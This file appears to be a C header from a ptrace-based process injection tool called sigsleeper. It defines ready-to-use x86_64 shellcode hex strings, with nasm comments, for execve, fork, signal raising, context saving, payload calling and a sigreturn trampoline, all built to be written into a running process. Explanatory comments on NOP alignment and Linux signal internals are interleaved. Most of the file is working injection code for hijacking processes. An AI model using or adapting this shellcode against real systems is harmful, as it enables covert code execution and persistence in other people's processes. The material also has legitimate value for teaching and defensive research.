
/* 
 *
 * emptymonkey's sigsleeper shellcode snippets
 *
 * 2013-09-23
 *
 *
 * In an attempt to abstract out as much assembly as possible, I've moved all the shellcode snippets into this 
 * file. These snippets make up the pieces of code we inject into the remote process (other than the payload
 * code given to us by the user, of course.)
 *
 */


/* 
 * We make use of "placeholders" quite a bit here to represent values we won't know until runtime. Specifically
 * these values generally aren't known until we've PTRACE_ATTACHed to the remote process and started inspecting
 * it. Some of the placeholder values represent remote memory addresses that refer to code we only just injected.
 *
 * These placeholder values were chosen as hex characters so I wouldn't have to modify the add_shellcode()
 * function. Also, it makes a quick numeric comparison possible. Really, anything should work here as long as it
 * doesn't match the surrounding shellcode, which we control anyway.
 *
 */

#define FILENAME_ADDR_PLACEHOLDER_STRING      "aaaaaaaaaaaaaaaa"
#define FILENAME_ADDR_PLACEHOLDER_NUM        0xaaaaaaaaaaaaaaaa

#define ARGV_ADDR_PLACEHOLDER_STRING          "bbbbbbbbbbbbbbbb"
#define ARGV_ADDR_PLACEHOLDER_NUM            0xbbbbbbbbbbbbbbbb

#define HANDLER_ADDR_PLACEHOLDER_STRING       "cccccccccccccccc"
#define HANDLER_ADDR_PLACEHOLDER_NUM         0xcccccccccccccccc

#define PAYLOAD_ADDR_PLACEHOLDER_STRING       "dddddddddddddddd"
#define PAYLOAD_ADDR_PLACEHOLDER_NUM         0xdddddddddddddddd

#define SIGNAL_NUMBER_PLACEHOLDER_STRING      "eeeeeeeeeeeeeeee"
#define SIGNAL_NUMBER_PLACEHOLDER_NUM        0xeeeeeeeeeeeeeeee


/*
 * Lessons in shellcoding: CISC and little-endian are hard, but NOPs are your friend.
 *
 * For example, here is some x86_64 nasm assembly for an execve() syscall:
 * (In this example we will be using the placeholder values above to represent the in-address memory locations
 * that we don't know until runtime.)
 *
 *		BITS 64
 *		GLOBAL _start
 *		_start:
 *		mov rax, 59                   ; __NR_execve
 *		mov rdi, 0xaaaaaaaaaaaaaaaa   ; Pointer to the filename. (i.e. argv[0])
 *		mov rsi, 0xbbbbbbbbbbbbbbbb   ; Pointer to argv array itself.
 *		xor rdx, rdx                  ; NULL pointer for envp.
 *		syscall
 *
 * This snippet of code would then be built with:
 *		nasm -f bin -o exec.bin exec.nasm
 *
 * Which is followed by shellcode generation with:
 *		xxd -p exec.bin >exec.sc
 *
 * The resultant opcodes then look like this:
 * (For a great opcode reference, check out: http://ref.x86asm.net/ )
 *
 *		48b83b00000000000000
 *		48bfaaaaaaaaaaaaaaaa
 *		48bebbbbbbbbbbbbbbbb
 *		4831d2
 *		0f05
 *
 * Unfortunately, being a CISC architecture, some of those instructions are larger than the wordsize of the
 * architecture! (On x86_64, the wordsize is 8 bytes long, but those first three arguments are 10 bytes long.) Keep in
 * mind, ptrace only works on words of data that are word-aligned, so this makes things very complicated. Here is that
 * that same chunk of opcodes, one word at a time:
 *
 *		48b83b0000000000
 *		000048bfaaaaaaaa
 *		aaaaaaaa48bebbbb
 *		bbbbbbbbbbbb4831
 *		d20f05
 *
 * You can see that we now have memory addresses, which we will need to manipulate at runtime, that cross word
 * boundaries. And keep in mind that this is a little-endiean system, which further complicates the situation.
 * What's a coder to do?
 *
 * Pad the damn thing with NOPs until the addresses that we need to mangle *are* word aligned! 
 *
 *		48b83b0000000000
 *		00009090909048bf
 *		aaaaaaaaaaaaaaaa
 *		90909090909048be
 *		bbbbbbbbbbbbbbbb
 *		4831d20f05
 *
 */


/*
 * Shellcode: exec() command
 *
 *		mov rax, 59                  ; __NR_execve
 *		nop                          ; Pad with NOPs to ensure placeholder alignment
 *		nop
 *		nop
 *		nop
 *		mov rdi, 0xaaaaaaaaaaaaaaaa  ; placeholder for filename address
 *		nop                          ; Pad with NOPs to ensure placeholder alignment
 *		nop
 *		nop
 *		nop
 *		nop
 *		nop
 *		mov rsi, 0xcccccccccccccccc  ; placeholder for argv address
 *		xor rdx, rdx                 ; NULL pointer for envp
 *		syscall
 *		ret
 *
 */
#define EXEC_SHELLCODE "48b83b000000000000009090909048bf" FILENAME_ADDR_PLACEHOLDER_STRING "90909090909048be" ARGV_ADDR_PLACEHOLDER_STRING "4831d20f05c3"


/*
 * Shellcode: raise() signal
 *
 *		; getpid()
 *		mov rax, 39 ; __NR_getpid
 *		syscall
 *
 *		; kill(pid, sig)
 *		mov rdi, rax                 ; pid
 *		mov rax, 62                  ; __NR_kill
 *		nop                          ; Pad with NOPs to ensure placeholder word alignment.
 *		nop
 *		nop
 *		nop
 *		nop
 *		mov rsi, 0xcccccccccccccccc  ; placeholder for signal value
 *		syscall
 *
 *		mov rax, 0
 *		ret
 *
 */
#define RAISE_SIGNAL_SHELLCODE "48b827000000000000000f054889c748b83e00000000000000909090909048be" SIGNAL_NUMBER_PLACEHOLDER_STRING "0f0548b80000000000000000c3"


/*
 * Shellcode: fork(), then have the parent return sucessfully
 *
 *		mov rax, 57                  ; __NR_fork
 *		syscall
 *		
 *		or  rax, rax                 ; Check if we are parent or child
 *		je  RUN                      ; We are the child. Jump to the nop sled and slide into the next section.
 *		mov rax, 0
 *		ret                          ; Return succesfully from the parent.
 *		
 *	RUN:
 *		nop                          ; Extra NOPs to pad out the word.
 *		nop
 *		nop
 *		nop
 *
 */
#define FORK_WITH_RET_SHELLCODE "48b839000000000000000f054809c0740b48b80000000000000000c390909090"


/*
 * Shellcode: fork(), then have the parent call the original signal handler.
 *
 *		mov rax, 57                  ; __NR_fork
 *		syscall
 *		
 *		or  rax, rax                 ; Check if we are parent or child
 *		je  RUN                      ; We are the child. Jump to the nop sled and slide into the next section.
 *		nop                          ; Pad with NOPs to ensure placeholder word alignment.
 *		nop
 *		nop
 *		nop
 *		nop
 *		mov rax, 0xcccccccccccccccc  ; Placeholder for the address of the original signal handler.
 *		call rax                     ; Parent process calls the original signal handler.
 *		ret                          ; Parent returns. (Success or failure depends on the original handler.)
 *		
 *	RUN:
 *		nop                          ; Extra NOPs to pad out the word.
 *		nop
 *		nop
 *		nop
 *		nop
 *
 */
#define FORK_WITH_CALL_HANDLER_SHELLCODE "48b839000000000000000f054809c07412909090909048b8" HANDLER_ADDR_PLACEHOLDER_STRING "ffd0c39090909090"


/*
 * Shellcode: save to the stack the registers that the kernel sets for the signal handler.
 *
 *		                             ; Register contents defined in kernel source at: arch/x86/kernel/signal.c
 *		push rdi                     ; regs->di = sig;
 *		push rax                     ; regs->ax = 0;
 *		push rsi                     ; regs->si = (unsigned long)&frame->info;
 *		push rdx                     ; regs->dx = (unsigned long)&frame->uc;
 *		nop                          ; Extra NOPs to pad out the word.
 *		nop
 *		nop
 *		nop
 *
 */
#define SAVE_SIG_CONTEXT_SHELLCODE "5750565290909090"


/*
 * Shellcode: call the payload shellcode segment.
 *
 *		nop                          ; Pad with NOPs to ensure placeholder word alignment.
 *		nop
 *		nop
 *		nop
 *		nop
 *		nop
 *		mov rax, 0xcccccccccccccccc  ; Placeholder for the payload shellcode address.
 *		call rax                     ; Call the payload.
 *		nop                          ; Extra NOPs to pad out the word.
 *		nop
 *		nop
 *		nop
 *		nop
 *		nop
 *
 */
#define CALL_PAYLOAD_SHELLCODE "90909090909048b8" PAYLOAD_ADDR_PLACEHOLDER_STRING "ffd0909090909090"


/*
 * Shellcode: return succesfully
 *
 *		mov rax, 0
 *		ret
 *
 */
#define RET_SUCCESS_SHELLCODE "48b80000000000000000c3"


/*
 * Shellcode: return unsuccesfully
 *
 *		mov rax, -1
 *		ret
 *
 */
#define RET_FAIL_SHELLCODE "48b8ffffffffffffffffc3"


/*
 * Shellcode: call the original signal handler
 *
 *		pop rdx                      ; Restore signal parameters from the kernel before calling the original handler.
 *		pop rsi
 *		pop rax
 *		pop rdi
 *		nop                          ; Pad with NOPs to ensure placeholder word alignment.
 *		nop
 *		mov rax, 0xcccccccccccccccc  ; Placeholder address for the original signal handler.
 *		call rax                     ; Call the original signal handler.
 *		ret                          ; Return. (Success or failure depends on the original handler.)
 *
 */
#define CALL_HANDLER_SHELLCODE "5a5e585f909048b8" HANDLER_ADDR_PLACEHOLDER_STRING "ffd0c3"


/*
 * Shellcode: exit() successfully.
 *
 *		mov rax, 60                  ; __NR_exit
 *		xor rdi, rdi                 ; Success.
 *		syscall
 *
 */
#define EXIT_SHELLCODE "48b83c000000000000004831ff0f05"


/*
 * Lessons in POSIX reliable signal internals on Linux: sigreturn is weird, but necessary.
 * 
 * This is another case where the man page will lie to you. Its in collaboration with glibc which is trying to protect
 * you from the strange underpinnings of the Linux kernel. When a signal is delivered, the kernel saves your current
 * execution state. A call to sigreturn will restore it. However you can't call it directly, even though it does need
 * to be called from userspace.
 * 
 * Examining the sigaction manpage yields the following:
 * "The sa_restorer element is obsolete and should not be used.  POSIX does not specify a sa_restorer element."
 * 
 * This is true, but misleading. It is obsolete from the perspective of a POSIX C library, but it's not obsolete to
 * the Linux kernel. The pointer value in sa_restorer is the return pointer that gets pushed onto the stack when a
 * signal is delivered. To shield the end user from this glibc tries to handle it for you. If you look in the
 * glibc source in sysdeps/unix/sysv/linux/x86_64/sigaction.c we'll see that the SA_RESTORER flag is *always* set, and
 * the sa_restorer function pointer points to some in-line assembly.
 * 
 * This inline assembly looks quite daunting, but almost all of it consists of DWARF elements to keep gdb happy. If
 * you dig into the actual assembly you will find it boils down to the following:
 * (Please pardon my nasm syntax. Obviously glibc uses gas.)
 *
 *		movq rax, 15	; __NR_rt_sigreturn
 *		syscall
 * 
 * Thats it. Thats all there is. It's just a trampoline. If you're writting signal handlers in assembly, make sure you
 * have * a sigreturn trampolene with the sa_restorer pointing to it and the SA_RESTORER flag set accordingly. This
 * way, when you call 'ret' at the end of your assembly signal handler, you can bounce off of the trampoline and into
 * the kernel, which will happily restore your original execution state for you.
 * 
 */


/*
 * Shellcode: sigreturn() trampoline
 *
 *		mov rax, 15                  ; __NR_rt_sigreturn
 *		syscall
 *
 */
#define SIGRETURN_SHELLCODE "48b80f000000000000000f05"

